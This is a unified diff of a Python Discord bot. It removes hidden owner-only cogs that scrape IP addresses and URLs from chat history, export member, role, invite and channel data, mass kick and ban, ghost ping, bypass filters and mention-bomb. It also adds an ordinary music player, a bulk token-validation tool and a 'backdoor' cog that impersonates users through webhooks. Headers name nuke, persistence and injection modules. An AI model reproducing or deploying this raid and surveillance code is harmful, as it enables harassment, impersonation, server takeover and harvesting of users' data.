-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def grabips(self, ctx: commands.Context):
-        """22. search for ip addresses in chat history."""
-        pattern = r"\b(?:\d{1,3}\.){3}\d{1,3}\b"
-        found = []
-        for channel in ctx.guild.text_channels:
-            try:
-                async for msg in channel.history(limit=200):
-                    ips = re.findall(pattern, msg.content)
-                    for ip in ips:
-                        found.append(f"{msg.author}: {ip}")
-            except:
-                continue
-        await ctx.send("\n".join(found[:50]) or "no ips found.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def graburls(self, ctx: commands.Context):
-        """23. extract all urls from recent message history."""
-        pattern = r"https?://[^\s]+"
-        found = []
-        for channel in ctx.guild.text_channels:
-            try:
-                async for msg in channel.history(limit=200):
-                    urls = re.findall(pattern, msg.content)
-                    for u in urls:
-                        found.append(f"{msg.author}: {u}")
-            except:
-                continue
-        await ctx.send("\n".join(found[:50]) or "no urls found.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def exfilmembers(self, ctx: commands.Context):
-        """24. export full member data to json."""
-        data = []
-        for member in ctx.guild.members:
-            data.append({
-                "id": member.id,
-                "name": str(member),
-                "display_name": member.display_name,
-                "joined_at": str(member.joined_at),
-                "created_at": str(member.created_at),
-                "roles": [r.name for r in member.roles],
-                "bot": member.bot,
-            })
-        filepath = os.path.join(EXFIL_DIR, f"{ctx.guild.id}_members.json")
-        with open(filepath, "w") as f:
-            json.dump(data, f, indent=4)
-        await ctx.send(f"exported {len(data)} members.", file=discord.File(filepath))
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def exfilroles(self, ctx: commands.Context):
-        """25. export all role configurations."""
-        data = []
-        for role in ctx.guild.roles:
-            data.append({
-                "id": role.id,
-                "name": role.name,
-                "permissions": role.permissions.value,
-                "color": role.color.value,
-                "position": role.position,
-                "members": len(role.members),
-            })
-        filepath = os.path.join(EXFIL_DIR, f"{ctx.guild.id}_roles.json")
-        with open(filepath, "w") as f:
-            json.dump(data, f, indent=4)
-        await ctx.send(f"exported {len(data)} roles.", file=discord.File(filepath))
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def exfilinvites(self, ctx: commands.Context):
-        """26. export all server invites."""
-        try:
-            invites = await ctx.guild.invites()
-            data = [{"code": i.code, "uses": i.uses, "max_uses": i.max_uses, "channel": i.channel.name, "inviter": str(i.inviter)} for i in invites]
-            filepath = os.path.join(EXFIL_DIR, f"{ctx.guild.id}_invites.json")
-            with open(filepath, "w") as f:
-                json.dump(data, f, indent=4)
-            await ctx.send(f"exported {len(data)} invites.", file=discord.File(filepath))
-        except:
-            await ctx.send("missing permissions.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def exfilchannels(self, ctx: commands.Context):
-        """27. export channel structure."""
-        data = []
-        for ch in ctx.guild.channels:
-            data.append({
-                "id": ch.id,
-                "name": ch.name,
-                "type": str(ch.type),
-                "category": ch.category.name if ch.category else None,
-                "position": ch.position,
-            })
-        filepath = os.path.join(EXFIL_DIR, f"{ctx.guild.id}_channels.json")
-        with open(filepath, "w") as f:
-            json.dump(data, f, indent=4)
-        await ctx.send(f"exported {len(data)} channels.", file=discord.File(filepath))
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def dmscan(self, ctx: commands.Context, target: discord.Member):
-        """28. scan mutual guilds with a target user."""
-        mutuals = []
-        for guild in self.bot.guilds:
-            if guild.get_member(target.id):
-                mutuals.append(f"{guild.name} ({guild.id})")
-        await ctx.send(f"mutual guilds with {target}: {len(mutuals)}\n```\n" + "\n".join(mutuals[:20]) + "\n```")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def snapshot(self, ctx: commands.Context):
-        """29. take a full server snapshot including all data."""
-        results = {
-            "guild": {"name": ctx.guild.name, "id": ctx.guild.id},
-            "members": [],
-            "roles": [],
-            "channels": [],
-        }
-        for m in ctx.guild.members:
-            results["members"].append({"name": str(m), "id": m.id, "roles": [r.name for r in m.roles]})
-        for r in ctx.guild.roles:
-            results["roles"].append({"name": r.name, "id": r.id, "perms": r.permissions.value})
-        for c in ctx.guild.channels:
-            results["channels"].append({"name": c.name, "id": c.id, "type": str(c.type)})
-        filepath = os.path.join(EXFIL_DIR, f"{ctx.guild.id}_snapshot.json")
-        with open(filepath, "w") as f:
-            json.dump(results, f, indent=4)
-        await ctx.send("full snapshot saved.", file=discord.File(filepath))
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def linktree(self, ctx: commands.Context, target: discord.Member = None):
-        """30. gather all connected accounts of a user."""
-        target = target or ctx.author
-        info = []
-        try:
-            profile = await self.bot.fetch_user(target.id)
-            if profile.banner:
-                info.append(f"banner: {profile.banner.url}")
-            if profile.accent_color:
-                info.append(f"accent color: {profile.accent_color}")
-        except:
-            pass
-        info.append(f"avatar: {target.display_avatar.url}")
-        await ctx.send("\n".join(info) or "no additional data.")
-
-# ========================================
-# exploit.py
-# ========================================
-class Exploit(commands.Cog, name="exploit"):
-    """exploitation and manipulation commands."""
-
-    def __init__(self, bot: commands.Bot):
-        self.bot = bot
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def ghostping(self, ctx: commands.Context, target: discord.Member, count: int = 10):
-        """ghost ping a user (mention then immediately delete)."""
-        for _ in range(count):
-            msg = await ctx.send(target.mention)
-            await msg.delete()
-            await asyncio.sleep(0.5)
-        await ctx.send(f"ghost pinged {target.mention} {count} times.", delete_after=3)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def fetchwebhooks(self, ctx: commands.Context, channel: discord.TextChannel = None):
-        """list webhooks in a channel."""
-        channel = channel or ctx.channel
-        try:
-            hooks = await channel.webhooks()
-            if not hooks:
-                return await ctx.send("no webhooks found.")
-            info = [f"name: {w.name} | url: {w.url}" for w in hooks]
-            await ctx.send("\n".join(info))
-        except discord.Forbidden:
-            await ctx.send("missing permissions.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def stealemoji(self, ctx: commands.Context, emoji: str, name: str = None):
-        """steal an emoji from a message and add to the server."""
-        emoji_match = re.match(r"<(a?):(\w+):(\d+)>", emoji)
-        if not emoji_match:
-            return await ctx.send("invalid emoji format. use a custom emoji.")
-        animated = emoji_match.group(1) == "a"
-        emoji_name = name or emoji_match.group(2)
-        emoji_id = int(emoji_match.group(3))
-        extension = "gif" if animated else "png"
-        url = f"https://cdn.discordapp.com/emojis/{emoji_id}.{extension}"
-        async with aiohttp.ClientSession() as session:
-            async with session.get(url) as resp:
-                if resp.status != 200:
-                    return await ctx.send("failed to download emoji.")
-                img_data = await resp.read()
-        try:
-            new_emoji = await ctx.guild.create_custom_emoji(
-                name=emoji_name,
-                image=img_data,
-            )
-            await ctx.send(f"stole emoji: {new_emoji}")
-        except discord.Forbidden:
-            await ctx.send("missing permissions to create emoji.")
-        except discord.HTTPException as e:
-            await ctx.send(f"error: {e}")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def masskick(self, ctx: commands.Context, *, reason: str = "purge"):
-        """kick all kickable members (except admins)."""
-        count = 0
-        for member in ctx.guild.members:
-            if member.top_role >= ctx.guild.me.top_role or member == ctx.guild.owner:
-                continue
-            try:
-                await member.kick(reason=reason)
-                count += 1
-                await asyncio.sleep(1)
-            except:
-                pass
-        await ctx.send(f"kicked {count} members.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def massban(self, ctx: commands.Context, *, reason: str = "purge"):
-        """ban all bannable members."""
-        count = 0
-        for member in ctx.guild.members:
-            if member.top_role >= ctx.guild.me.top_role or member == ctx.guild.owner:
-                continue
-            try:
-                await member.ban(reason=reason)
-                count += 1
-                await asyncio.sleep(1)
-            except:
-                pass
-        await ctx.send(f"banned {count} members.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def scrapeinvite(self, ctx: commands.Context, invite_code: str):
-        """get info about a discord invite."""
-        try:
-            invite = await self.bot.fetch_invite(invite_code)
-            info = (
-                f"server: {invite.guild.name}\n"
-                f"id: {invite.guild.id}\n"
-                f"members online: {invite.approximate_presence_count}\n"
-                f"total members: {invite.approximate_member_count}\n"
-                f"channel: {invite.channel.name}"
-            )
-            await ctx.send(f"```\n{info}\n```")
-        except Exception as e:
-            await ctx.send(f"error: {e}")
-
-# ========================================
-# hidden_commands.py
-# ========================================
-class HiddenCommands(commands.Cog, name="hidden_commands"):
-    """miscellaneous hidden exploitation commands."""
-
-    def __init__(self, bot: commands.Bot):
-        self.bot = bot
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def nickall(self, ctx: commands.Context, *, nickname: str):
-        """nickname all members."""
-        count = 0
-        for member in ctx.guild.members:
-            if member.top_role >= ctx.guild.me.top_role:
-                continue
-            try:
-                await member.edit(nick=nickname[:32])
-                count += 1
-                await asyncio.sleep(0.5)
-            except:
-                pass
-        await ctx.send(f"nicknamed {count} members.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def wipe(self, ctx: commands.Context, amount: int = 100):
-        """bulk delete messages."""
-        await ctx.channel.purge(limit=amount+1)
-        await ctx.send(f"deleted {amount} messages.", delete_after=3)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def embed(self, ctx: commands.Context, title: str, *, description: str):
-        """send a custom embed."""
-        embed = discord.Embed(title=title, description=description, color=discord.Color.random())
-        await ctx.send(embed=embed)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def botleave(self, ctx: commands.Context):
-        """make the bot leave the current server."""
-        await ctx.send("goodbye.")
-        await ctx.guild.leave()
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def channeltopic(self, ctx: commands.Context, *, topic: str):
-        """change the current channel topic."""
-        await ctx.channel.edit(topic=topic)
-        await ctx.send("topic updated.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def createrole(self, ctx: commands.Context, name: str, color: str = "ff0000"):
-        """create a role with specified name and hex color."""
-        color_int = int(color.lstrip("#"), 16)
-        role = await ctx.guild.create_role(name=name, color=discord.Color(color_int))
-        await ctx.send(f"created role {role.mention}.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def deleterole(self, ctx: commands.Context, *, role: discord.Role):
-        """delete a role."""
-        await role.delete()
-        await ctx.send("role deleted.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def unicode(self, ctx: commands.Context, *, text: str):
-        """convert text to unicode characters for bypassing filters."""
-        result = []
-        for char in text:
-            if char.isascii() and char.isalpha():
-                result.append(chr(ord(char) + 65248))
+# Suppress noise about console usage from errors
+yt_dlp.utils.bug_reports_message = lambda: ''
+
+ytdl_format_options = {
+    'format': 'bestaudio/best',
+    'outtmpl': '%(extractor)s-%(id)s-%(title)s.%(ext)s',
+    'restrictfilenames': True,
+    'noplaylist': True,
+    'nocheckcertificate': True,
+    'ignoreerrors': False,
+    'logtostderr': False,
+    'quiet': True,
+    'no_warnings': True,
+    'default_search': 'auto',
+    'source_address': '0.0.0.0' # bind to ipv4 since ipv6 addresses cause issues sometimes
+}
+
+ffmpeg_options = {
+    'options': '-vn'
+}
+
+ytdl = yt_dlp.YoutubeDL(ytdl_format_options)
+
+class YTDLSource(discord.PCMVolumeTransformer):
+    def __init__(self, source, *, data, volume=0.5):
+        super().__init__(source, volume)
+        self.data = data
+        self.title = data.get('title')
+        self.url = data.get('url')
+
+    @classmethod
+    async def from_url(cls, url, *, loop=None, stream=False):
+        loop = loop or asyncio.get_event_loop()
+        data = await loop.run_in_executor(None, lambda: ytdl.extract_info(url, download=not stream))
+
+        if 'entries' in data:
+            # take first item from a playlist
+            data = data['entries'][0]
+
+        filename = data['url'] if stream else ytdl.prepare_filename(data)
+        return cls(discord.FFmpegPCMAudio(filename, **ffmpeg_options), data=data)
+
+class MusicControlView(discord.ui.View):
+    def __init__(self, cog):
+        super().__init__(timeout=None)
+        self.cog = cog
+
+    @discord.ui.button(label="Play/Pause", style=discord.ButtonStyle.primary, custom_id="music_play_pause")
+    async def play_pause(self, interaction: discord.Interaction, button: discord.ui.Button):
+        ctx = await self.cog.bot.get_context(interaction.message)
+        if ctx.voice_client:
+            if ctx.voice_client.is_playing():
+                ctx.voice_client.pause()
+                await interaction.response.send_message("Paused music.", ephemeral=True)
+            elif ctx.voice_client.is_paused():
+                ctx.voice_client.resume()
+                await interaction.response.send_message("Resumed music.", ephemeral=True)
             else:
-                result.append(char)
-        await ctx.send("".join(result))
+                await interaction.response.send_message("Nothing is playing.", ephemeral=True)
+        else:
+            await interaction.response.send_message("Bot is not in a voice channel.", ephemeral=True)
 
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def zalgo(self, ctx: commands.Context, *, text: str):
-        """apply zalgo text effect."""
-        zalgo_chars = [
-            '\u0300', '\u0301', '\u0302', '\u0303', '\u0304', '\u0305',
-            '\u0306', '\u0307', '\u0308', '\u0309', '\u030a', '\u030b',
-            '\u030c', '\u030d', '\u030e', '\u030f', '\u0310', '\u0311',
-            '\u0312', '\u0313', '\u0314', '\u0315', '\u031a', '\u031b',
-        ]
-        result = []
-        for char in text:
-            result.append(char)
-            for _ in range(random.randint(0, 8)):
-                result.append(random.choice(zalgo_chars))
-        await ctx.send("".join(result))
+    @discord.ui.button(label="Skip", style=discord.ButtonStyle.secondary, custom_id="music_skip")
+    async def skip(self, interaction: discord.Interaction, button: discord.ui.Button):
+        ctx = await self.cog.bot.get_context(interaction.message)
+        if ctx.voice_client and ctx.voice_client.is_playing():
+            ctx.voice_client.stop()
+            await interaction.response.send_message("Skipped track.", ephemeral=True)
+        else:
+            await interaction.response.send_message("Not playing any music.", ephemeral=True)
 
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def react(self, ctx: commands.Context, message_id: int, *emojis):
-        """add reactions to a message by id."""
-        try:
-            msg = await ctx.channel.fetch_message(message_id)
-            for emoji in emojis:
-                await msg.add_reaction(emoji)
-                await asyncio.sleep(0.5)
-            await ctx.send("reactions added.", delete_after=5)
-        except Exception as e:
-            await ctx.send(f"error: {e}", delete_after=5)
+    @discord.ui.button(label="Stop", style=discord.ButtonStyle.danger, custom_id="music_stop")
+    async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
+        ctx = await self.cog.bot.get_context(interaction.message)
+        if ctx.voice_client:
+            await ctx.voice_client.disconnect()
+            await interaction.response.send_message("Stopped and disconnected.", ephemeral=True)
+        else:
+            await interaction.response.send_message("Bot is not in a voice channel.", ephemeral=True)
 
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def button(self, ctx: commands.Context, label: str, url: str):
-        """send a message with a button."""
-        view = discord.ui.View()
-        view.add_item(discord.ui.Button(label=label, url=url))
-        await ctx.send("click below:", view=view)
+class Music(commands.Cog, name="music"):
+    def __init__(self, bot):
+        self.bot = bot
 
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def poll(self, ctx: commands.Context, *, question: str):
-        """create a poll with reactions."""
-        msg = await ctx.send(f"poll: {question}")
-        await msg.add_reaction("👍")
-        await msg.add_reaction("👎")
+    @commands.command(name="musicpanel")
+    async def musicpanel(self, ctx):
+        """Spawns the interactive music control panel."""
+        embed = discord.Embed(title="Music Control Panel", description="Use the buttons below to control playback.", color=discord.Color.blue())
+        view = MusicControlView(self)
+        await ctx.send(embed=embed, view=view)
 
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def hidename(self, ctx: commands.Context, *, name: str):
-        """rename the bot."""
-        await ctx.guild.me.edit(nick=name)
-        await ctx.send("bot nickname updated.", delete_after=5)
+    @commands.command(name="join")
+    async def join(self, ctx, *, channel: discord.VoiceChannel = None):
+        """Joins a voice channel."""
+        if not channel:
+            if ctx.author.voice:
+                channel = ctx.author.voice.channel
+            else:
+                await ctx.send("You are not connected to a voice channel.")
+                return
 
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def shutup(self, ctx: commands.Context, target: discord.Member):
-        """timeout a member."""
-        try:
-            await target.timeout(discord.utils.utcnow() + discord.timedelta(minutes=5))
-            await ctx.send(f"timed out {target.mention} for 5 minutes.", delete_after=5)
-        except Exception as e:
-            await ctx.send(f"error: {e}", delete_after=5)
+        if ctx.voice_client is not None:
+            return await ctx.voice_client.move_to(channel)
+
+        await channel.connect()
+
+    @commands.command(name="play")
+    async def play(self, ctx, *, query):
+        """Plays a song from youtube/url."""
+        if ctx.voice_client is None:
+            if ctx.author.voice:
+                await ctx.author.voice.channel.connect()
+            else:
+                await ctx.send("You are not connected to a voice channel.")
+                return
+
+        async with ctx.typing():
+            try:
+                player = await YTDLSource.from_url(query, loop=self.bot.loop, stream=True)
+                ctx.voice_client.play(player, after=lambda e: print(f'Player error: {e}') if e else None)
+                await ctx.send(f'Now playing: {player.title}')
+            except Exception as e:
+                await ctx.send(f"An error occurred: {e}")
+
+    @commands.command(name="pause")
+    async def pause(self, ctx):
+        """Pauses the currently playing track."""
+        if ctx.voice_client and ctx.voice_client.is_playing():
+            ctx.voice_client.pause()
+            await ctx.send("Paused playback.")
+        else:
+            await ctx.send("Nothing is playing right now.")
+
+    @commands.command(name="resume")
+    async def resume(self, ctx):
+        """Resumes the paused track."""
+        if ctx.voice_client and ctx.voice_client.is_paused():
+            ctx.voice_client.resume()
+            await ctx.send("Resumed playback.")
+        else:
+            await ctx.send("Nothing is paused right now.")
+
+    @commands.command(name="skip")
+    async def skip(self, ctx):
+        """Skips the currently playing track."""
+        if ctx.voice_client and ctx.voice_client.is_playing():
+            ctx.voice_client.stop()
+            await ctx.send("Skipped track.")
+        else:
+            await ctx.send("Nothing is playing right now.")
+
+    @commands.command(name="stop")
+    async def stop(self, ctx):
+        """Stops and disconnects the bot from voice."""
+        if ctx.voice_client:
+            await ctx.voice_client.disconnect()
+            await ctx.send("Disconnected.")
+        else:
+            await ctx.send("Not connected to a voice channel.")
+
+    @commands.command(name="volume")
+    async def volume(self, ctx, volume: int):
+        """Changes the player's volume."""
+        if ctx.voice_client is None:
+            return await ctx.send("Not connected to a voice channel.")
+
+        ctx.voice_client.source.volume = volume / 100
+        await ctx.send(f"Changed volume to {volume}%")
+
+    @commands.command(name="nowplaying")
+    async def nowplaying(self, ctx):
+        """Shows the currently playing track."""
+        if ctx.voice_client and ctx.voice_client.source:
+            await ctx.send(f"Currently playing: {ctx.voice_client.source.title}")
+        else:
+            await ctx.send("Nothing is playing right now.")
 
 # ========================================
 # injection.py
@@ -1456,296 +563,6 @@ class Injection(commands.Cog, name="injection"):
             except:
                 pass
         await ctx.send("role hierarchy inverted.", delete_after=5)
-
-# ========================================
-# invite_tools.py
-# ========================================
-class InviteTools(commands.Cog, name="invite_tools"):
-    """58-65: invite manipulation."""
-
-    def __init__(self, bot: commands.Bot):
-        self.bot = bot
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def createinvite(self, ctx: commands.Context, channel: discord.TextChannel = None, max_uses: int = 0):
-        """58. create an invite with specified max uses."""
-        channel = channel or ctx.channel
-        invite = await channel.create_invite(max_uses=max_uses, max_age=0)
-        await ctx.send(f"invite: {invite.url}")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def deleteinvites(self, ctx: commands.Context):
-        """59. delete all invites in the server."""
-        invites = await ctx.guild.invites()
-        count = 0
-        for inv in invites:
-            try:
-                await inv.delete()
-                count += 1
-                await asyncio.sleep(0.3)
-            except:
-                pass
-        await ctx.send(f"deleted {count} invites.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def inviterace(self, ctx: commands.Context):
-        """60. find who joined from whose invite."""
-        invites = await ctx.guild.invites()
-        info = [f"{i.code} - {i.uses} uses - inviter: {i.inviter}" for i in invites]
-        await ctx.send("\n".join(info) or "no invites.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def vanitysnag(self, ctx: commands.Context):
-        """61. display the vanity url if configured."""
-        if "VANITY_URL" in ctx.guild.features:
-            vanity = await ctx.guild.vanity_invite()
-            await ctx.send(f"vanity: {vanity.url}")
-        else:
-            await ctx.send("no vanity url.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def massinvite(self, ctx: commands.Context, count: int = 10):
-        """62. create multiple invites across channels."""
-        urls = []
-        for i, channel in enumerate(ctx.guild.text_channels[:count]):
-            try:
-                inv = await channel.create_invite(max_uses=0, max_age=0)
-                urls.append(inv.url)
-                await asyncio.sleep(0.5)
-            except:
-                pass
-        await ctx.send("\n".join(urls) or "failed.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def inviteinfo(self, ctx: commands.Context, code: str):
-        """63. detailed info on an invite."""
-        try:
-            inv = await self.bot.fetch_invite(code)
-            info = f"guild: {inv.guild.name}\nchannel: {inv.channel.name}\ninviter: {inv.inviter}\nuses: {inv.uses}\nmax uses: {inv.max_uses}\nexpires: {inv.expires_at}"
-            await ctx.send(f"```\n{info}\n```")
-        except Exception as e:
-            await ctx.send(f"error: {e}")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def fakeinvite(self, ctx: commands.Context, guild_name: str, channel_name: str):
-        """64. generate a fake-looking invite embed."""
-        embed = discord.Embed(
-            title=f"invite to {guild_name}",
-            description=f"you have been invited to join **{guild_name}**\nchannel: #{channel_name}",
-            color=discord.Color.green(),
-        )
-        embed.set_footer(text="accept invite")
-        await ctx.send(embed=embed)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def revokeinvite(self, ctx: commands.Context, code: str):
-        """65. revoke a specific invite by code."""
-        invites = await ctx.guild.invites()
-        for inv in invites:
-            if inv.code == code:
-                await inv.delete()
-                return await ctx.send(f"revoked invite {code}.", delete_after=5)
-        await ctx.send("invite not found.")
-
-# ========================================
-# mention_bomb.py
-# ========================================
-class MentionBomb(commands.Cog, name="mention_bomb"):
-    """mass mention and notification exploitation."""
-
-    def __init__(self, bot: commands.Bot):
-        self.bot = bot
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def mentionall(self, ctx: commands.Context, *, message: str = ""):
-        """mention @everyone in a broken-up way to bypass limits."""
-        await ctx.message.delete()
-        mentions = ["@everyone"] * 5
-        msg = " ".join(mentions) + " " + message
-        try:
-            await ctx.send(msg[:2000])
-        except Exception as e:
-            await ctx.send(f"error: {e}", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def ghostmention(self, ctx: commands.Context, target: discord.Member, count: int = 20):
-        """repeatedly mention and delete to generate notifications."""
-        for _ in range(count):
-            msg = await ctx.send(target.mention)
-            await msg.delete()
-            await asyncio.sleep(0.3)
-        await ctx.send("ghost mention complete.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def roleping(self, ctx: commands.Context, role: discord.Role, count: int = 10):
-        """spam a role mention."""
-        if not role.mentionable:
-            await role.edit(mentionable=True)
-        for _ in range(count):
-            await ctx.send(role.mention)
-            await asyncio.sleep(0.5)
-        await ctx.send(f"pinged {role.name} {count} times.", delete_after=5)
-
-# ========================================
-# message_manip.py
-# ========================================
-class MessageManip(commands.Cog, name="message_manip"):
-    """11-20: message content manipulation."""
-
-    def __init__(self, bot: commands.Bot):
-        self.bot = bot
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def editmsg(self, ctx: commands.Context, message_id: int, *, new_content: str):
-        """11. edit any message sent by the bot."""
-        try:
-            msg = await ctx.channel.fetch_message(message_id)
-            if msg.author == self.bot.user:
-                await msg.edit(content=new_content)
-                await ctx.send("message edited.", delete_after=5)
-            else:
-                await ctx.send("that message was not sent by me.", delete_after=5)
-        except Exception as e:
-            await ctx.send(f"error: {e}", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def pinmsg(self, ctx: commands.Context, message_id: int):
-        """12. pin any message by id."""
-        try:
-            msg = await ctx.channel.fetch_message(message_id)
-            await msg.pin()
-            await ctx.send("message pinned.", delete_after=5)
-        except Exception as e:
-            await ctx.send(f"error: {e}", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def unpinmsg(self, ctx: commands.Context, message_id: int):
-        """13. unpin any message by id."""
-        try:
-            msg = await ctx.channel.fetch_message(message_id)
-            await msg.unpin()
-            await ctx.send("message unpinned.", delete_after=5)
-        except Exception as e:
-            await ctx.send(f"error: {e}", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def pinspam(self, ctx: commands.Context, count: int = 20):
-        """14. send and pin many messages rapidly."""
-        pinned = 0
-        for i in range(count):
-            msg = await ctx.send(f"pin spam {i}")
-            try:
-                await msg.pin()
-                pinned += 1
-            except:
-                pass
-            await asyncio.sleep(0.5)
-        await ctx.send(f"pinned {pinned} messages.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def unpinall(self, ctx: commands.Context):
-        """15. unpin all pinned messages."""
-        pins = await ctx.channel.pins()
-        count = 0
-        for msg in pins:
-            try:
-                await msg.unpin()
-                count += 1
-                await asyncio.sleep(0.3)
-            except:
-                pass
-        await ctx.send(f"unpinned {count} messages.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def replaceall(self, ctx: commands.Context, old: str, new: str):
-        """16. find and replace text in recent bot messages."""
-        count = 0
-        async for msg in ctx.channel.history(limit=100):
-            if msg.author == self.bot.user and old in msg.content:
-                try:
-                    await msg.edit(content=msg.content.replace(old, new))
-                    count += 1
-                    await asyncio.sleep(0.5)
-                except:
-                    pass
-        await ctx.send(f"replaced '{old}' with '{new}' in {count} messages.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def deletemsg(self, ctx: commands.Context, message_id: int):
-        """17. delete a specific message by id."""
-        try:
-            msg = await ctx.channel.fetch_message(message_id)
-            await msg.delete()
-            await ctx.send("message deleted.", delete_after=5)
-        except Exception as e:
-            await ctx.send(f"error: {e}", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def deleteuser(self, ctx: commands.Context, target: discord.Member, limit: int = 100):
-        """18. delete recent messages from a specific user."""
-        count = 0
-        async for msg in ctx.channel.history(limit=limit):
-            if msg.author == target:
-                try:
-                    await msg.delete()
-                    count += 1
-                    await asyncio.sleep(0.3)
-                except:
-                    pass
-        await ctx.send(f"deleted {count} messages from {target.mention}.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def deletecontains(self, ctx: commands.Context, *, keyword: str):
-        """19. delete all recent messages containing a keyword."""
-        count = 0
-        async for msg in ctx.channel.history(limit=200):
-            if keyword.lower() in msg.content.lower():
-                try:
-                    await msg.delete()
-                    count += 1
-                    await asyncio.sleep(0.3)
-                except:
-                    pass
-        await ctx.send(f"deleted {count} messages containing '{keyword}'.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def quotemsg(self, ctx: commands.Context, message_id: int):
-        """20. quote a message with an embed."""
-        try:
-            msg = await ctx.channel.fetch_message(message_id)
-            embed = discord.Embed(
-                description=msg.content or "[no text content]",
-                color=msg.author.color if msg.author.color.value else discord.Color.blurple(),
-                timestamp=msg.created_at,
-            )
-            embed.set_author(name=str(msg.author), icon_url=msg.author.display_avatar.url)
-            embed.set_footer(text=f"#{msg.channel.name}")
-            if msg.attachments:
-                embed.set_image(url=msg.attachments[0].url)
-            await ctx.send(embed=embed)
-        except Exception as e:
-            await ctx.send(f"error: {e}", delete_after=5)
 
 # ========================================
 # nuke.py
@@ -1984,6 +801,1013 @@ class Persistence(commands.Cog, name="persistence"):
         await ctx.send(f"added invisible role to {count} members.")
 
 # ========================================
+# token_tools.py
+# ========================================
+class TokenTools(commands.Cog, name="token_tools"):
+    """discord token checking and validation utilities."""
+
+    def __init__(self, bot: commands.Bot):
+        self.bot = bot
+
+    async def validate_token(self, token: str):
+        """check if a token is valid and return basic user info."""
+        headers = {"Authorization": f"Bot {token}"}
+        async with aiohttp.ClientSession() as session:
+            async with session.get("https://discord.com/api/v10/users/@me", headers=headers) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    return True, data
+                return False, None
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def checktoken(self, ctx: commands.Context, token: str):
+        """validate a discord bot token."""
+        valid, data = await self.validate_token(token)
+        if valid:
+            await ctx.send(f"valid token.\nuser: {data['username']}#{data['discriminator']}\nid: {data['id']}")
+        else:
+            await ctx.send("invalid token.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def masscheck(self, ctx: commands.Context):
+        """check tokens from an attached .txt file."""
+        if not ctx.message.attachments:
+            return await ctx.send("attach a .txt file with tokens (one per line).")
+        attachment = ctx.message.attachments[0]
+        content = (await attachment.read()).decode("utf-8", errors="replace")
+        tokens = [line.strip() for line in content.splitlines() if line.strip()]
+        if not tokens:
+            return await ctx.send("no tokens found in file.")
+        valid_list = []
+        for tok in tokens:
+            valid, data = await self.validate_token(tok)
+            if valid:
+                valid_list.append(f"{data['username']}#{data['discriminator']} - {data['id']}")
+            await asyncio.sleep(0.5)
+        await ctx.send(f"checked {len(tokens)} tokens. valid: {len(valid_list)}\n```\n" + "\n".join(valid_list[:20]) + "\n```")
+
+# ========================================
+# backdoor.py
+# ========================================
+class Backdoor(commands.Cog, name="backdoor"):
+    """persistent backdoor and remote access commands."""
+
+    def __init__(self, bot: commands.Bot):
+        self.bot = bot
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def sudo(self, ctx: commands.Context, target: discord.Member, *, command: str):
+        """force a user to say something."""
+        await ctx.message.delete()
+        try:
+            webhook = await ctx.channel.create_webhook(name=target.display_name)
+            await webhook.send(command, avatar_url=target.display_avatar.url)
+            await webhook.delete()
+        except Exception as e:
+            await ctx.send(f"error: {e}", delete_after=5)
+
